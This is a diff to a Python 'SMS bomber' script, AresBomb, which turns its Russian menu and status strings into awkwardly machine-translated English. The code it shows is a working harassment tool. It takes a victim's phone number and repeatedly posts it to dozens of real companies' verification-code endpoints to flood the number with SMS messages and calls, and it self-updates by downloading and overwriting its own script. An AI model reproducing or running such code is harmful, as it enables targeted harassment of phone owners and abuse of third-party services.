@@ -42,14 +42,14 @@ def save_phones():
 		print(banner)
 		for i in range(int(len(fav_phones)/2)):
 			print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
-		print("\n1 - Добавить номер\n2 - Удалить номер\n0 - Выйти")
+		print("\n1 - Add number\n2 - Delete number\n0 - Exit")
 		_menu = input()
 		if _menu == "0": break
 		if _menu == "1":
-			fav_phones.append(input("Введите номер: "))
-			fav_phones.append(input("Введите метку для номера: "))
+			fav_phones.append(input("Enter number: "))
+			fav_phones.append(input("Enter a label for the number: "))
 		if _menu == "2":
-	 		delete_phones = int(input("Введите номер номера, который вы хотите удалить: "))
+	 		delete_phones = int(input("Enter the number of the number you want to delete: "))
 	 		fav_phones.pop(delete_phones*2)
 	 		fav_phones.pop(delete_phones*2)
 		with open('phones.data', 'w') as filehandle:
@@ -58,24 +58,24 @@ def save_phones():
 
 def update():
 	global version
-	print("Проверка обновлений")
+	print("checking for updates")
 	try:
 		upd=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/last_version.txt')
 		upd_vers = float(upd.text[0:6])
 		if upd_vers > version:
-			print("Найдено обновление\n" + upd.text[0:6] + "\nИзменения:\n" + upd.text[7:])
-			print("\nНачато обновление")
+			print("Found update\n" + upd.text[0:6] + "\nChanges:\n" + upd.text[7:])
+			print("\nUpdate started")
 			upd_boom=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/boom.py')
 			f = open("boom.py", "wb")
 			f.write(upd_boom.content)
 			f.close()
-			print("\nОбновление завершено, откройте бомбер заново командой\npython boom.py")
+			print("\nUpdate completed, reopen the bomber with the command\npython boom.py")
 			return "exit"
-		elif upd_vers == version: print("Установлена последняя версия, вы прекрасны")
-		elif upd_vers < version: print("Не хочешь попасть в команду?")
-		else: print("Ошибка, файл обновлений не найден")
+		elif upd_vers == version: print("The latest version is installed, you are beautiful")
+		elif upd_vers < version: print("Do you want to join the team?")
+		else: print("Error, update file not found")
 	except BaseException:
-		print("Нет интернета, попробуйте позже")
+		print("No internet, try again later")
 
 def send_sms(serv):
 	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
@@ -129,26 +129,26 @@ def send_sms(serv):
 	elif serv == 47: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
 	elif serv == 48: post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
 	elif serv == 49: post('https://b.utair.ru/api/v1/login/', data = {'login': _phone, }, headers = {'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
-	else: print("Ошибка сервиса")
+	else: print("Service error")
 
 def send_call(serv):
 	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
 	if serv == 0: requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-	else: print("Ошибка сервиса")
+	else: print("Service error")
 
 def bomb():
 	global set, _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
 	_count_finish = 0
 	print(banner)
-	_phone = input('Введите номер для бомбинга (79xxxxxxxxx)\n1 - Выбрать номер из избранного\n')
+	_phone = input('Enter Bombing Number (66xxxxxxxxx)\n1 - Select a number from favorites\n')
 	if _phone == "1": return_phones()
 	try:
-		_count = int(input('Количество сообщений: (100 по умолчанию)'))
+		_count = int(input('Number of posts: (100 by default)'))
 	except:
 		_count = 100
 		
 	try:
-		_timer = float(input('Интервал между сообщениями: (0 по умолчанию) '))
+		_timer = float(input('Message Interval: (0 by default) '))
 	except:
 		_timer = 0
 		
@@ -174,8 +174,8 @@ def bomb():
 	
 	def screen():
 		print(banner)
-		print("\nДля остановки немедленной нажмите Ctrl+Z\n")
-		print('Номер: '+ _phone+ '\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
+		print("\nTo stop immediately, press Ctrl+Z\n")
+		print('room: '+ _phone+ '\nGood luck ' + str(_count_finish) + ' of ' + str(_count))
 	
 	while _count_finish != _count:
 		randsh = random.randint(1,100)
@@ -184,33 +184,33 @@ def bomb():
 			try:
 				send_call(_service_call)
 				screen()
-				print("Сервис звонок " + str(_service_call) + " отправлен")
+				print("Service call " + str(_service_call) + " sent")
 				_count_finish += 1
 			except:
 				screen()
-				print("!!! Сервис звонок " + str(_service_call) + " не отправлен")
+				print("!!! Service call " + str(_service_call) + " is not sent")
 		else:
 			_service_sms = random.randint(0, 48)
 			try:
 				send_sms(_service_sms)
 				screen()
-				print("Сервис смс " + str(_service_sms) + " отправлен")
+				print("SMS service " + str(_service_sms) + " sent")
 				_count_finish += 1
 			except:
 				screen()
-				print("!!! Сервис смс " + str(_service_sms) + " не отправлен")
+				print("!!! SMS service " + str(_service_sms) + " is not sent")
 		time.sleep(_timer)
-	print(banner+'\nРезультат:\n\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
+	print(banner+'\nResult:\n\nGood luck ' + str(_count_finish) + ' of ' + str(_count))
 	if set[0] == 1.0: exit()
-	else: input("Бомбинг завершён, нажмите ENTER для выхода в главное меню")
+	else: input("Bombing is completed, press ENTER to exit to the main menu")
 
 def settings():
 	global set
 	while True:
 		print(banner)
-		print("\n1 - Выходить из программы поле бомбинга: " + str(set[0]))
-		print("2 - Вероятность бомбинга звонками: " + str(set[1])+"%")
-		print("\n0 - Выход из этого меню и сохранение")
+		print("\n1 - Exit the bombing field program: " + str(set[0]))
+		print("2 - Call bombing probability: " + str(set[1])+"%")
+		print("\n0 - Exit this menu and save")
 		menu = input()
 		if menu == "0":
 			with open('config.data', 'w') as filehandle:  
@@ -222,11 +222,11 @@ def settings():
 			elif set[0] == 0: set[0] = 1
 		elif menu == "2":
 			print(banner)
-			set[1] = float(input("\nВведите шанс звонка: "))
+			set[1] = float(input("\nEnter call chance: "))
 
 def info():
 	global banner, version
-	print(banner+"\nВерсия "+str(version)+"\n\nБомбер создан только для развлекательных целей. За все действия что вы с ним проводите отвечаете только вы\n\nОригинальный бомбер: https://github.com/FSystem88/spymer\n\nСоздатель данной модификации telete.in/MaksPV\n\nНажмите ENTER чтобы выйти")
+	print(banner+"\nVersion "+str(version)+"\n\nThe bomber is designed for entertainment purposes only. Only you are responsible for all the actions that you carry out with him\n\nOriginal bomber jacket: https://github.com/FSystem88/spymer\n\nThe creator of this modification telete.in/MaksPV\n\nPress ENTER to exit")
 	input()
 
 if update() == "exit": exit()
@@ -248,7 +248,7 @@ while True:
  telegram channel: @AresBomb                         
 	"""
 	print(banner)
-	menu = input("1 - Начать бомбинг\n2 - Настройки бомбера\n3 - Номера в избранном\n4 - Информация о бомбере\n\n0 - Выход\n")
+	menu = input("1 - Start bombing\n2 - Bomber settings\n3 - Numbers in Favorites\n4 - Bomber Information\n\n0 - Exit\n")
 	if menu == "0": exit()
 	if menu == "1": bomb()
 	if menu == "2": settings()
